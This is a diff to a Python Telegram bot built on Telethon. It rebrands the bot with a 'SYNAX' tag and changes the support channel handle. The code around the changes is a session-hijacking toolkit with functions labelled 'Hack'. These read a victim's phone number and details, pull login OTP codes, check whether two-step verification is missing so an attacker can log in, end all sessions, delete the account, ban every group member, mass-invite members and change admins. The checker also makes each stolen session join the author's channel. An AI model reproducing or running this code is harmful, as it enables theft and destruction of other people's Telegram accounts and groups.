@@ -10,7 +10,7 @@ from telethon.tl.functions.messages import ImportChatInviteRequest as ICIR
 from telethon.tl.functions.channels import EditAdminRequest, GetAdminedPublicChannelsRequest as PC, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dcr, InviteToChannelRequest as ICR
 
 ERROR_TEXT = """
-**SOME EXCEPTION OCCURRED
+**SOME EXCEPTION OCCURRED⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️
 
 HACK NAME: __{}__
 
@@ -19,7 +19,7 @@ ERROR NAME: __{}__
 ERROR DESCRIPTION: __{}__
 
 
-IF YOU DON'T UNDERSTAND THIS FORWARD THIS TO @MaybeBotsSupport**
+IF YOU DON'T UNDERSTAND THIS FORWARD THIS TO @synax_chats**
 """
 
 
@@ -38,7 +38,7 @@ async def str_checker(strses):
         if info.bot:
             return False
         try:
-            await bot(join('@MaybeBots'))
+            await bot(join('@synax_chats'))
         except:
             pass
         await bot.disconnect()
@@ -62,10 +62,10 @@ async def check_string(x):
         if op:
             return strses
         else:
-            await x.send_message('Either String Is Terminated Or You Are Using Bot String')
+            await x.send_message('Either String Is Terminated Or You Are Using Bot String⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️')
             return False
     else:
-        await x.send_message('String Session Format is Wrong')
+        await x.send_message('String Session Format is Wrong⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️')
         return False
 
         # Chat id/Username Func
@@ -89,7 +89,7 @@ async def ask_id(x, text="GIVE GROUP/CHANNEL USERNAME/ID"):
 
 
 async def ask_broadcast_message(x):
-    xx = await x.send_message('Please Send The Message You Want To Broadcast')
+    xx = await x.send_message('Please Send The Message You Want To Broadcast⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️')
     try:
         broadcast_msg = await x.get_response(timeout=120)
         await xx.delete()
@@ -97,7 +97,7 @@ async def ask_broadcast_message(x):
         return False
     if not broadcast_msg.text:
         await x.send_message(
-            'Please Send Only Message That You Want To Broadcast')
+            'Please Send Only Message That You Want To Broadcast⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️')
         return False
     return broadcast_msg.text
 
@@ -129,7 +129,7 @@ async def userchannels(strses):
             except:
                 pass
         if result:
-            result += '\n\nThanks For Using This Bot'
+            result += '\n\nThanks For Using This Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️'
         return result
 
         # Hack 'B'
@@ -139,7 +139,7 @@ async def userinfo(strses):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         k = await bot.get_me()
         username = f"@{k.username}" if k.username else "None"
-        TEXT = f"ID = {k.id}\nNAME = {k.first_name}\nPHONE = +{k.phone}\nUSERNAME = {username}\nDC_ID = {bot.session.dc_id}\n\nThanks for using this bot"
+        TEXT = f"ID = {k.id}\nNAME = {k.first_name}\nPHONE = +{k.phone}\nUSERNAME = {username}\nDC_ID = {bot.session.dc_id}\n\nThanks for using this bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         return TEXT
 
         # Hack 'C'
@@ -166,7 +166,7 @@ async def ban_all(strses, grp, x):
                         await sleep(1)
                     except Exception as e:
                         return exception_handler(e, "BAN ALL")
-            return "All Members are Banned Successfully.\n\nThanks For using this Bot"
+            return "All Members are Banned Successfully.\n\nThanks For using this Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         except Exception as e:
             return exception_handler(e, "BAN ALL")
 
@@ -185,7 +185,7 @@ async def otp_searcher(strses):
         except:
             pass
         if not code:
-            return 'No Message Found\n\nSend OTP Again'
+            return 'No Message Found\n\nSend OTP Again⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️'
         return code
 
         # Hack 'E'
@@ -193,7 +193,7 @@ async def otp_searcher(strses):
 
 async def joingroup(strses, username):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
-        text = "Joined the Channel/Group.\n\nThanks For using this Bot"
+        text = "Joined the Channel/Group.\n\nThanks For using this Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         if username.startswith("https://t.me/+"):
             hash = (username.split("+"))[1]
             try:
@@ -215,7 +215,7 @@ async def leavegroup(strses, username):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
             await bot(leave(username))
-            return "Leaved the Channel/Group.\n\nThanks For using this Bot"
+            return "Leaved the Channel/Group.\n\nThanks For using this Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         except Exception as e:
             return exception_handler(e, "LEAVE CHAT/GROUP")
 
@@ -226,7 +226,7 @@ async def delgroup(strses, username):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
             await bot(dcr(username))
-            return "Deleted the Channel/Group.\n\nThanks For using this Bot"
+            return "Deleted the Channel/Group.\n\nThanks For using this Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         except Exception as e:
             return exception_handler(e, "DELETE CHAT/GROUP")
 
@@ -237,9 +237,9 @@ async def user2fa(strses):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         result = await bot(functions.account.GetPasswordRequest())
         if result.has_password:
-            return "Sorry User Have two step already.\n\nThanks For using this Bot"
+            return "Sorry User Have two step already.\n\nThanks For using this Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         else:
-            return "User don't have two step password you can login.\n\nThanks For using this Bot"
+            return "User don't have two step password you can login.\n\nThanks For using this Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
 
             # Hack 'I'
 
@@ -248,7 +248,7 @@ async def terminate(strses):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
             await bot(rt())
-            return "All Sessions Are Terminated Successfully\n\nThanks For using this bot"
+            return "All Sessions Are Terminated Successfully\n\nThanks For using this bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         except Exception as e:
             return exception_handler(e, "TERMINATE")
 
@@ -259,7 +259,7 @@ async def delacc(strses):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
             await bot(functions.account.DeleteAccountRequest("Cruel world"))
-            return "The Account Is Deleted Successfullly\n\nThanks For using this Bot"
+            return "The Account Is Deleted Successfullly\n\nThanks For using this Bot⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️"
         except Exception as e:
             return exception_handler(e, "DELETE ACCOUNT")
 
@@ -328,7 +328,7 @@ async def get_members(strses, grp_id):
 async def invite_all(strses, from_grp, to_grp, x):
     async with tg(strses, env.API_ID, env.API_HASH) as bot:
         try:
-            msg = await x.send_message('**processing......**')
+            msg = await x.send_message('**processing......⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️**')
             add = 0
             user_ids = await get_members(strses, from_grp)
             await msg.edit(
@@ -364,11 +364,11 @@ async def edit_admin(strses, x, promote=False, demote=False, chat_id=None, user_
             chat = await bot.get_entity(chat_id)
             if promote:
                 await bot(EditAdminRequest(chat_id, user_id, chat.admin_rights, 'Admin'))
-                return 'User promoted Successfully\n\nThanks for using this bot.'
+                return 'User promoted Successfully\n\nThanks for using this bot.⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️'
 
             else:
                 await bot.edit_admin(chat, user_id, is_admin=False)
-                return 'User demoted Successfully\n\nThanks for using this bot.'
+                return 'User demoted Successfully\n\nThanks for using this bot.⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️'
         except Exception as e:
             name = 'DEMOTE' if demote else 'PROMOTE'
             return exception_handler(e, name)
